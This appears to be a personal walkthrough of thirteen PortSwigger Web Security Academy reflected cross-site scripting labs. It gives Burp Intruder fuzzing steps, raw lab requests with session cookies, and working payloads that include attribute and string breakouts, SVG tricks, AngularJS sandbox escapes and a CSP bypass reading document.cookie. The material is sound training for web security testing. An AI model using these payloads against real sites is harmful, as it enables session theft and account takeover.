## XXX(Cross-site scripting)

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions
that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities
normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.
If the victim user has privileged access within the application,
then the attacker might be able to gain full control over all of the application's functionality and data. 


## 1. Reflected XSS into HTML context with nothing encoded

You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html like

    <h1>
    0 search results for 'asif'
    </h1>
     

 ## This is Vulnerably

 ## 2. Reflected XSS into attribute with angle brackets HTML-encoded
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html input filed like
 
    <input type=text placeholder='Search the blog...' name=search value="asif">

Notice That 

    name=search value="asif" 
    
 The asif is double '' so use the paylods like double '' for example 
 
    "onmouseover="alert(1)
    
 
 ## This is Vulnerably
 
 
 ## 3. Reflected XSS into a JavaScript string with angle brackets HTML encoded 
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript filed like
 
    <script>
    var searchTerms = 'asif';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
 
 Paylods 
 
    '-alert(1)-'
 
 
 ## This is vulnerably 
 
 
 ## 4. Reflected XSS into HTML context with most tags and attributes blocked
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html This is 
 vulnerably and Inject a standard XSS paylods Observe that this gets blocked most html tages attributes are blocked.
 
You Have a Search Funtion and search like asif and intercept the request and sand the intruder and remove asif and add <> and set paylods in <> like <$$> 
 
    GET /?search=<$$> HTTP/1.1
    Host: 0a130031045b2eeac06b090600110008.web-security-academy.net
    Cookie: session=Xvy6OLwWRumjRFxHQqruIfV77mnV5YmN
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a130031045b2eeac06b090600110008.web-security-academy.net/
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
 
Visit the XSS cheat sheet and click "Copy tags to clipboard". 

In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".

When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response. 

## body tags is 200 Ok

Go back to the Positions tab in Burp Intruder and replace your search term and set paylods position <body%20&&=1> like 

    GET /?search=<body%20§§=1> HTTP/1.1
    Host: 0ac4000e03c21f41c110a9200039006d.web-security-academy.net
    Cookie: session=743GVgVjqrfVKWWEuPfUvbDnYFHCsM5l
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0ac4000e03c21f41c110a9200039006d.web-security-academy.net/
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
   

 Visit the XSS cheat sheet and click "copy events to clipboard".
 
 In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the  payloads list. Click "Start attack".
 
 When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response. 
 
 ## onresize 200 ok
 
 Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID: 
 
    <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
     
  Click "Store" and "Deliver exploit to victim". 
 
 
 ## 5. Reflected XSS into HTML context with all tags blocked except custom ones
 
  Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID: 
  
    <script>
    location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>
  
 Click "Store" and "Deliver exploit to victim".
 
 
 ## 6. Reflected XSS into a JavaScript string with single quote and backslash escaped
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript string
 
 Try Search like 
 
     asif'khan
     
and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. like

    <h1>
    0 search results for 'asif&apos;khan'
    </h1>
    
    <script>
    var searchTerms = 'asif\'khan';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
    
You search asif'khan but respotion in html 'asif&apos;khan' in JavaScript respotion 'asif\'khan'; 

so i am useing These Script 

    </script><script>alert(1)</script>
    
    
    
    
 ## 7. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
    
  You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript
  
  Try Search like
  
     asif'khan
     
 and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. like
 
      <h1>
    0 search results for 'asif&apos;khan'
    </h1>
    
    <script>
    var searchTerms = 'asif\'khan';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
  
 You search asif'khan but respotion in html 'asif&apos;khan' in JavaScript respotion 'asif\'khan'; 
 
 Try Search like
 
     asif\khan
     
 and observe that your backslash doesn't get escaped like 
   
     <h1>
     0 search results for 'asif/khan'
     </h1>
     
     <script>
     var searchTerms = 'asif/khan';
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     </script>
     
 You search asif'khan but respotion in html 'asif\khan' in JavaScript respotion 'asif\khan'; 
 
 Replace your input with the following payload to break out of the JavaScript string and inject an alert:
 
     \'-alert(1)//
     
     
  ## 8. Reflected XSS in canonical link tag
  
  Visit the following URL, add paylods in url like
  
    example.com/?%27accesskey=%27x%27onclick=%27alert(1)
    
 Add paylods in url like 
 
    ?%27accesskey=%27x%27onclick=%27alert(1)
    
 And Enter 
 
 To trigger the exploit on yourself, press one of the following key combinations: 
 
    On Windows: ALT+SHIFT+X
    
    On MacOS: CTRL+ALT+X
    
    On Linux: Alt+X
    
 Show The opoop
 
  
 ## 9. Reflected XSS with some SVG markup allowed 
  
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html This is 
 vulnerably and Inject a standard XSS paylods Observe that this gets blocked most html tages attributes are blocked.
  
You Have a Search Funtion and search like asif and intercept the request and sand the intruder and remove asif and add <> and set paylods in <> like <$$>
  
    GET /?search=<$$> HTTP/1.1
    Host: 0a130031045b2eeac06b090600110008.web-security-academy.net
    Cookie: session=Xvy6OLwWRumjRFxHQqruIfV77mnV5YmN
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a130031045b2eeac06b090600110008.web-security-academy.net/
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
  
 Visit the XSS cheat sheet and click "Copy tags to clipboard".
 
 In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
 
 When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the svg, animatetransform, title, and  image tags payload, which caused a 200   response. 
  
 ## svg, animatetransform, title, and image tags 200 OKK
  
 Go back to the Positions tab in Burp Intruder and replace your search term with: 
 
    <svg><animatetransform%20§§=1>
    
 ## replace 
 
    GET /?search=<svg><animatetransform%20§§=1> HTTP/1.1
    Host: 0a130031045b2eeac06b090600110008.web-security-academy.net
    Cookie: session=Xvy6OLwWRumjRFxHQqruIfV77mnV5YmN
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a130031045b2eeac06b090600110008.web-security-academy.net/
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
    
 Visit the XSS cheat sheet and click "Copy events to clipboard". 
 
 In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
 
 When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onbegin payload, which caused a 200 response. 
 
 Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved:
 
    exmple.com/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
  
  
 ## 10. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript template string like
    
       <script>
       var message = `0 search results for 'asif'`;
       document.getElementById('searchMessage').innerText = message;
       </script>
    
  Replace your input with the following payload to execute JavaScript inside the template string:
  
      ${alert(1)}
      
  
 ## 11. Reflected XSS with event handlers and href attributes blocked
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html
  
 To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.
 
 ## Exploit 
 
 example.com/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
 
 
 ## 12. Reflected XSS with AngularJS sandbox escape without strings
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in Angular JS sandbox
 
    <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'asif';
    $scope.value = $parse(key)($scope.query);
    });</script>
 
 
 This website uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS
 
 The website, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.
 
 ## This is vulnerably
 
 ## Exploit 
 
    example.com/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 
 
 
 ## 13. Reflected XSS with AngularJS sandbox escape and CSP
 
 This website uses CSP and AngularJS. 
 
 perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie
 
 ## EXPLOIT 
 
     <script>
     location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
     </script>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
